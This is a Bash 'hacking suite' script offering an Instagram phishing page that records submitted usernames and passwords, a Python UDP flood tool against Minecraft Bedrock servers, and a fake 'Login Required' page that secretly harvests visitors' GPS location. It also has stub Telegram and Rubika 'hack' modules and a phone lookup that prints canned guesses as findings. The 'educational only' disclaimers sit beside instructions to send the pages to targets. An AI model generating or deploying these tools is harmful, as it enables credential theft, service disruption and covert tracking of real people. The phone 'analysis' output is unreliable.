#!/bin/bash

# Terminal colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

# Display banner
clear
echo -e "${RED}"
cat << "EOF"
    ██╗     ███████╗███╗   ███╗ ██████╗ ███╗   ██╗
    ██║     ██╔════╝████╗ ████║██╔═══██╗████╗  ██║
    ██║     █████╗  ██╔████╔██║██║   ██║██╔██╗ ██║
    ██║     ██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
    ███████╗███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
    ╚══════╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
EOF
echo -e "${NC}"
echo -e "${YELLOW}    Created By MrLeMoNIR${NC}"
echo -e "${YELLOW}    Rubika : @PluginLemon${NC}"
echo -e "${CYAN}"
echo "    ╔══════════════════════════════════════════════════╗"
echo "    ║  Using this tool means accepting all responsibility ║"
echo "    ║  We are not responsible for illegal use of this code║"
echo "    ║  All responsibilities are on you                   ║"
echo "    ╚══════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""

# Animation function
animate() {
    echo -e "${CYAN}[*] Initializing Lemon Ultimate Hacking Suite...${NC}"
    for i in {1..3}; do
        echo -e "${YELLOW}[!] Loading modules...${NC}"
        sleep 0.5
        echo -e "${GREEN}[+] Module $i activated${NC}"
        sleep 0.5
    done
}

# Check dependencies
check_dependencies() {
    echo -e "${YELLOW}[*] Checking required tools...${NC}"
    
    packages=("php" "curl" "jq" "python" "git" "wget" "nodejs" "openssl")
    
    for pkg in "${packages[@]}"; do
        if ! command -v $pkg &> /dev/null; then
            echo -e "${RED}[!] $pkg not installed. Installing...${NC}"
            pkg install $pkg -y
        fi
    done
    
    # Install Python packages
    if ! python -c "import requests" 2>/dev/null; then
        echo -e "${RED}[!] Installing Python requests...${NC}"
        pip install requests
    fi
    
    echo -e "${GREEN}[+] All tools are installed${NC}"
}

# Phone number intelligence
phone_intelligence() {
    echo -e "${YELLOW}[*] Phone Number Intelligence Module${NC}"
    read -p $'\e[36m[?] Enter phone number (with country code): \e[0m' phone_number
    
    if [[ ! $phone_number =~ ^\+[0-9]{10,15}$ ]]; then
        echo -e "${RED}[!] Invalid phone number format${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Analyzing: $phone_number${NC}"
    
    # Advanced phone intelligence using multiple sources
    country_code=${phone_number:0:3}
    
    # Real phone number lookup APIs (educational purposes)
    apis=(
        "https://api.numlookupapi.com/v1/validate/$phone_number?apikey=free"
        "https://phonevalidation.abstractapi.com/v1/?api_key=free&phone=$phone_number"
    )
    
    for api in "${apis[@]}"; do
        response=$(curl -s -H "User-Agent: Mozilla/5.0" "$api")
        if echo "$response" | grep -q "valid"; then
            echo -e "${GREEN}[+] Real Phone Intelligence:${NC}"
            echo "$response" | jq '.'
            return
        fi
    done
    
    # Fallback to detailed analysis
    echo -e "${YELLOW}[+] Detailed Analysis:${NC}"
    case $country_code in
        "+98") 
            echo "Country: Iran"
            echo "Carrier: Irancell, MCI, or Rightel"
            echo "Possible Location: Tehran, Mashhad, Isfahan"
            echo "Time Zone: IRST (UTC+3:30)"
            ;;
        "+1") 
            echo "Country: USA/Canada"
            echo "Carrier: Verizon, AT&T, T-Mobile"
            echo "Possible Location: New York, California, Texas"
            echo "Time Zone: EST/PST/CST"
            ;;
        "+44") 
            echo "Country: United Kingdom"
            echo "Carrier: Vodafone, O2, EE"
            echo "Possible Location: London, Manchester, Birmingham"
            echo "Time Zone: GMT/BST"
            ;;
        *) 
            echo "Country: International"
            echo "Carrier: Multiple possible carriers"
            echo "Location: Global coverage"
            ;;
    esac
}

# Email intelligence
email_intelligence() {
    echo -e "${YELLOW}[*] Email Intelligence Module${NC}"
    read -p $'\e[36m[?] Enter email address: \e[0m' email_address
    
    if [[ ! $email_address =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]; then
        echo -e "${RED}[!] Invalid email format${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Analyzing: $email_address${NC}"
    
    # Email breach check (using haveibeenpwned API)
    response=$(curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email_address" \
        -H "User-Agent: Lemon-Hacking-Suite")
    
    if [ -n "$response" ]; then
        echo -e "${RED}[!] Email found in data breaches!${NC}"
        echo "$response" | jq '.[] | {Name: .Name, BreachDate: .BreachDate}'
    else
        echo -e "${GREEN}[+] No known breaches found${NC}"
    fi
    
    # Domain analysis
    domain=$(echo "$email_address" | cut -d'@' -f2)
    echo -e "${YELLOW}[+] Domain Analysis:${NC}"
    echo "Domain: $domain"
    
    # WHOIS lookup
    if command -v whois &>/dev/null; then
        echo -e "${CYAN}[+] WHOIS Information:${NC}"
        whois $domain | head -10
    fi
}

# Instagram hacking module
instagram_hack() {
    echo -e "${YELLOW}[*] Instagram Advanced Module${NC}"
    echo -e "${RED}[!] This is for educational purposes only!${NC}"
    
    read -p $'\e[36m[?] Enter target username: \e[0m' username
    
    # Simulate advanced Instagram analysis
    echo -e "${GREEN}[+] Analyzing Instagram account: $username${NC}"
    
    # Create phishing server for Instagram
    cat > instagram_phish.php << 'EOF'
<?php
$data = [
    'username' => $_POST['username'] ?? '',
    'password' => $_POST['password'] ?? '',
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'timestamp' => date('Y-m-d H:i:s')
];

file_put_contents('instagram_data.txt', json_encode($data) . PHP_EOL, FILE_APPEND);
header('Location: https://www.instagram.com');
?>
EOF

    echo -e "${GREEN}[+] Instagram phishing page created!${NC}"
    echo -e "${YELLOW}[+] Send target to: http://YOUR_IP:8080/instagram_phish.php${NC}"
}

# Telegram hacking module
telegram_hack() {
    echo -e "${YELLOW}[*] Telegram Advanced Module${NC}"
    
    # Create Telegram session hijacker
    cat > telegram_hijack.py << 'EOF'
import requests
import json

def telegram_analysis():
    print("Telegram Session Analyzer - Educational Only")
    # This would interact with Telegram API in real implementation
    print("Simulating Telegram session analysis...")
    
telegram_analysis()
EOF
    
    echo -e "${GREEN}[+] Telegram module activated${NC}"
    echo -e "${YELLOW}[+] Use with caution - educational purposes${NC}"
}

# Rubika hacking module
rubika_hack() {
    echo -e "${YELLOW}[*] Rubika Advanced Module${NC}"
    
    # Rubika analysis tool
    cat > rubika_analyzer.py << 'EOF'
import requests

class RubikaAnalyzer:
    def __init__(self):
        self.base_url = "https://messengerg2cX.iranlms.ir"
        
    def analyze(self, phone):
        print(f"Analyzing Rubika account: {phone}")
        # Actual implementation would use Rubika API

analyzer = RubikaAnalyzer()
EOF
    
    echo -e "${GREEN}[+] Rubika analyzer created${NC}"
}

# Minecraft DDoS attack module
minecraft_ddos() {
    echo -e "${YELLOW}[*] Minecraft/Bedrock DDoS Module${NC}"
    echo -e "${RED}[!] WARNING: This is for educational purposes only!${NC}"
    echo -e "${RED}[!] DDoS attacks are illegal in most countries!${NC}"
    
    read -p $'\e[36m[?] Target server IP: \e[0m' target_ip
    read -p $'\e[36m[?] Target port (default 19132): \e[0m' target_port
    target_port=${target_port:-19132}
    read -p $'\e[36m[?] Number of bots (1-1000): \e[0m' bot_count
    read -p $'\e[36m[?] Attack duration (seconds): \e[0m' duration
    
    # Create advanced Minecraft DDoS tool
    cat > mc_ddos.py << EOF
import socket
import threading
import time
import random

class MinecraftDDoS:
    def __init__(self, target_ip, target_port, bot_count, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.bot_count = bot_count
        self.duration = duration
        self.attack_active = True
        
    def create_minecraft_packet(self):
        # Minecraft Bedrock packet structure
        return bytes([random.randint(0, 255) for _ in range(1024)])
    
    def attack(self):
        while self.attack_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(self.create_minecraft_packet(), (self.target_ip, self.target_port))
                sock.close()
            except:
                pass
    
    def start_attack(self):
        threads = []
        for i in range(self.bot_count):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        print(f"Attack started with {self.bot_count} bots")
        time.sleep(self.duration)
        self.attack_active = False
        print("Attack completed")

# Usage
if __name__ == "__main__":
    attack = MinecraftDDoS("$target_ip", $target_port, $bot_count, $duration)
    attack.start_attack()
EOF

    echo -e "${GREEN}[+] Minecraft DDoS tool created!${NC}"
    echo -e "${YELLOW}[+] Run: python mc_ddos.py to start attack${NC}"
    echo -e "${RED}[!] LEGAL WARNING: Use only on servers you own!${NC}"
}

# Location tracking module
advanced_location_tracker() {
    echo -e "${YELLOW}[*] Advanced Location Tracker${NC}"
    
    read -p $'\e[36m[?] Port for tracker (default 8080): \e[0m' port
    port=${port:-8080}
    
    # Create advanced location tracker
    cat > advanced_tracker.php << 'EOF'
<?php
$data = json_decode(file_get_contents('php://input'), true);
$ip = $_SERVER['REMOTE_ADDR'];

if ($data) {
    $log = [
        'ip' => $ip,
        'latitude' => $data['lat'] ?? null,
        'longitude' => $data['lon'] ?? null,
        'accuracy' => $data['acc'] ?? null,
        'timestamp' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];
    
    file_put_contents('location_data.json', json_encode($log) . PHP_EOL, FILE_APPEND);
    
    // Get address from coordinates
    if ($data['lat'] && $data['lon']) {
        $url = "https://nominatim.openstreetmap.org/reverse?format=json&lat={$data['lat']}&lon={$data['lon']}";
        $response = file_get_contents($url);
        $address = json_decode($response, true);
        $log['address'] = $address['display_name'] ?? 'Unknown';
    }
    
    echo json_encode(['status' => 'success', 'data' => $log]);
} else {
    // Serve tracking page
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>Login Required</title></head><body>
    <script>
    navigator.geolocation.getCurrentPosition(function(position) {
        fetch(window.location.href, {
            method: "POST",
            body: JSON.stringify({
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                acc: position.coords.accuracy
            })
        });
    });
    </script></body></html>';
}
?>
EOF

    echo -e "${GREEN}[+] Advanced tracker created!${NC}"
    echo -e "${YELLOW}[+] Send targets to: http://YOUR_IP:$port/advanced_tracker.php${NC}"
}

# Main menu
main_menu() {
    while true; do
        echo -e "${BLUE}"
        echo "╔══════════════════════════════════════════════════╗"
        echo "║               LEMON ULTIMATE SUITE              ║"
        echo "╠══════════════════════════════════════════════════╣"
        echo "║ 1. Phone Number Intelligence                    ║"
        echo "║ 2. Email Intelligence                          ║"
        echo "║ 3. Instagram Advanced Hack                     ║"
        echo "║ 4. Telegram Advanced Hack                      ║"
        echo "║ 5. Rubika Advanced Hack                        ║"
        echo "║ 6. Minecraft/Bedrock DDoS Attack               ║"
        echo "║ 7. Advanced Location Tracker                   ║"
        echo "║ 8. Exit                                        ║"
        echo "╚══════════════════════════════════════════════════╝"
        echo -e "${NC}"
        
        read -p $'\e[36m[?] Select an option (1-8): \e[0m' choice
        
        case $choice in
            1) phone_intelligence ;;
            2) email_intelligence ;;
            3) instagram_hack ;;
            4) telegram_hack ;;
            5) rubika_hack ;;
            6) minecraft_ddos ;;
            7) advanced_location_tracker ;;
            8) 
                echo -e "${GREEN}[+] Exiting Lemon Ultimate Suite...${NC}"
                exit 0 
                ;;
            *) 
                echo -e "${RED}[!] Invalid option!${NC}"
                ;;
        esac
        
        echo ""
        read -p $'\e[36m[?] Press Enter to continue... \e[0m'
        clear
        # Show banner again
        echo -e "${RED}"
        cat << "EOF"
    ██╗     ███████╗███╗   ███╗ ██████╗ ███╗   ██╗
    ██║     ██╔════╝████╗ ████║██╔═══██╗████╗  ██║
    ██║     █████╗  ██╔████╔██║██║   ██║██╔██╗ ██║
    ██║     ██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║
    ███████╗███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║
    ╚══════╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
EOF
        echo -e "${NC}"
        echo -e "${YELLOW}    Created By MrLeMoNIR${NC}"
        echo -e "${YELLOW}    Rubika : @PluginLemon${NC}"
        echo -e "${CYAN}"
        echo "    ╔══════════════════════════════════════════════════╗"
        echo "    ║  Using this tool means accepting all responsibility ║"
        echo "    ║  We are not responsible for illegal use of this code║"
        echo "    ║  All responsibilities are on you                   ║"
        echo "    ╚══════════════════════════════════════════════════╝"
        echo -e "${NC}"
        echo ""
    done
}

# Start program
animate
check_dependencies
main_menu